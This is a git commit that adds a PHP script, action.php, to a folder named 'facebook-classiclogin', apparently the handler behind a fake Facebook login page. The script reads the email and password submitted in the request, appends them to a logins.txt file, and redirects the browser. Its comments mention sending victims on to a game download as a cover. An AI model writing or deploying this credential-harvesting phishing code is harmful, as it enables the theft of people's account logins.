8c0aafa6aa00f8ff23c45f5e8b730ee17975a888
eternalodball <84136173+eternalodball@users.noreply.github.com>
2022-03-09 07:54:17 -0500

    Add files via upload

---
+++ facebook-classiclogin/action.php
@@ -0,0 +1,25 @@
+
+<?php
+
+			session_start();
+			
+			$email=$_GET["email"];
+			$pass = $_GET["pass"];
+			
+			
+			//opening logins text file for appending new data.
+  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
+			
+  			//Writing email and password to logins.txt. 
+  			fwrite($file, $email.">".$pass.PHP_EOL);			
+  			fclose($file);//closing logins.txt.
+			
+  			//redirecting user to the google drive's locations where the game is available to download.
+  			//change the location url to redirect to a website of your choice.
+  			header("Location: /logins.txt");
+			exit();
+			
+			session_destroy();
+			
+
+?>
